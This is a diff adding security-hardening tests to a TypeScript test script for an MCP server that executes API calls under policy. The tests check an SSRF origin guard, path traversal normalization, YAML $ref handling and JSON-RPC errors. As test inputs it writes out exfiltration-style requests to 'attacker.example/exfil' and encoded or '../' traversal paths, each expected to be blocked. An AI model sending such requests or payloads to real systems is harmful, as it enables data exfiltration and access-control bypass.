@@ -3,7 +3,7 @@ import http from "node:http";
 import path from "node:path";
 import os from "node:os";
 import { CodeModeMcpServer, API_PRESETS, loadOpenApiSpec, parseCliArgs } from "./server.ts";
-import { indexOpenApiSpec, loadPolicyConfig, buildAuditPolicies, executeCodeMode, searchSpec, type OpenApiOperation, type OpenApiSpec } from "./index.ts";
+import { indexOpenApiSpec, loadPolicyConfig, buildAuditPolicies, executeCodeMode, searchSpec, normalizeApiPath, type OpenApiOperation, type OpenApiSpec } from "./index.ts";
 
 /**
  * Generates a realistic multi-service Cloud Infrastructure OpenAPI v3 specification
@@ -812,6 +812,154 @@ paths:
     console.log("    - [VERIFIED] CLI flags, GET /health, POST /mcp, and GET /sse + POST /messages round-trip");
   } finally {
     await startedHttp.close();
+  }
+
+  // 14. Test SSRF Origin Guard, Traversal Normalization, YAML $ref/Server Variables, Path Params & JSON-RPC Ping/Errors
+  console.log("\n[14] TESTING SSRF ORIGIN GUARD, TRAVERSAL NORMALIZATION, YAML $REF & JSON-RPC HARDENING");
+  const canonicalPath = normalizeApiPath("/accounts/123/zones/../%69%61%6d/roles");
+  if (canonicalPath !== "/accounts/123/iam/roles") {
+    throw new Error(`Expected normalized path '/accounts/123/iam/roles', got '${canonicalPath}'`);
+  }
+
+  const ssrfAndTraversalDryRun = await executeCodeMode(
+    `
+      const checks = {};
+      for (const [key, method, target] of [
+        ["encodedIam", "POST", "/accounts/123/%69%61%6d/roles"],
+        ["traversalIam", "POST", "/accounts/123/zones/../iam/roles"],
+        ["httpGet", "GET", "http://attacker.example/exfil"],
+        ["crossOrigin", "GET", "https://attacker.example/exfil"]
+      ]) {
+        try {
+          await api.request(method, target);
+          checks[key] = "UNEXPECTED_ALLOW";
+        } catch (err) {
+          checks[key] = String(err && err.message ? err.message : err);
+        }
+      }
+      return checks;
+    `,
+    {
+      baseUrl: "https://api.example.com/v1",
+      policies: auditPolicies,
+      dryRun: true,
+    }
+  );
+  const secChecks = ssrfAndTraversalDryRun.result as Record<string, string>;
+  if (
+    !secChecks.encodedIam?.includes("protect-sensitive-account-paths") ||
+    !secChecks.traversalIam?.includes("protect-sensitive-account-paths") ||
+    !secChecks.httpGet?.includes("block-insecure-http-origins") ||
+    !secChecks.crossOrigin?.includes("Blocked cross-origin request")
+  ) {
+    throw new Error(`Unexpected security hardening check results: ${JSON.stringify(secChecks)}`);
+  }
+
+  const hardeningYamlFile = path.join(os.tmpdir(), `codemode-hardening-${Date.now()}.yaml`);
+  await fs.writeFile(
+    hardeningYamlFile,
+    `openapi: "3.0.3"
+info:
+  title: "YAML Ref & Variables API"
+  version: "1.0.0"
+servers:
+  - url: https://{region}.api.example.com/{version}
+    variables:
+      region:
+        default: us-east
+      version:
+        default: v1
+components:
+  schemas:
+    ZoneItem:
+      type: object
+      required:
+        - id
+        - status
+      properties:
+        id:
+          type: string
+        status:
+          type: string
+paths:
+  /zones/{account_id}:
+    parameters:
+      - name: account_id
+        in: path
+        required: true
+        schema:
+          type: string
+    get:
+      summary: Fetch zone status
+      responses:
+        "200":
+          description: OK
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ZoneItem' # inline YAML comment must not truncate $ref
+`,
+    "utf8"
+  );
+
+  try {
+    const parsedYamlSpec = await loadOpenApiSpec(hardeningYamlFile);
+    const yamlMcpServer = new CodeModeMcpServer({
+      spec: parsedYamlSpec,
+      policies: auditPolicies,
+      dryRun: true,
+    });
+
+    const yamlSearchRes = await yamlMcpServer.handleToolCall("search", { query: "zones" });
+    const yamlSearchJson = JSON.parse(yamlSearchRes.content[0]?.text ?? "{}") as {
+      endpoints: Array<{ typeHints?: { parameters?: string; response?: string } }>;
+    };
+    const yamlHints = yamlSearchJson.endpoints[0]?.typeHints;
+    if (
+      !yamlHints?.parameters?.includes("account_id: string") ||
+      !yamlHints?.response?.includes("status: string")
+    ) {
+      throw new Error(`Expected merged path parameter and resolved YAML $ref response hints, got: ${JSON.stringify(yamlHints)}`);
+    }
+
+    const sameOriginExec = await yamlMcpServer.handleToolCall("execute", {
+      code: `
+        const ok = await api.request("GET", "https://us-east.api.example.com/v1/zones/acc_1");
+        let mismatchErr = "";
+        try {
+          await api.request("GET", "https://other.api.example.com/v1/zones/acc_1");
+        } catch (err) {
+          mismatchErr = String(err && err.message ? err.message : err);
+        }
+        return { ok, mismatchErr };
+      `,
+    });
+    const execOutcome = JSON.parse(sameOriginExec.content[0]?.text ?? "{}") as {
+      result?: { ok?: { dryRun?: boolean }; mismatchErr?: string };
+    };
+    if (
+      execOutcome.result?.ok?.dryRun !== true ||
+      !execOutcome.result?.mismatchErr?.includes("https://us-east.api.example.com")
+    ) {
+      throw new Error(`Expected server variable interpolation and same-origin check, got: ${JSON.stringify(execOutcome)}`);
+    }
+
+    const pingRes = (await yamlMcpServer.handleJsonRpcMessage({
+      jsonrpc: "2.0",
+      id: 77,
+      method: "ping",
+    })) as { result?: Record<string, unknown> };
+    const unknownRes = (await yamlMcpServer.handleJsonRpcMessage({
+      jsonrpc: "2.0",
+      id: 78,
+      method: "unknown/method",
+    })) as { error?: { code?: number } };
+    if (!pingRes?.result || Object.keys(pingRes.result).length !== 0 || unknownRes?.error?.code !== -32601) {
+      throw new Error(`Unexpected JSON-RPC responses: ping=${JSON.stringify(pingRes)} unknown=${JSON.stringify(unknownRes)}`);
+    }
+    console.log("    - [VERIFIED] SSRF guard, path traversal normalization, YAML $ref/server vars, path params & JSON-RPC ping/-32601");
+  } finally {
+    await fs.unlink(hardeningYamlFile).catch(() => {});
   }
 
   console.log("\n==================================================================");
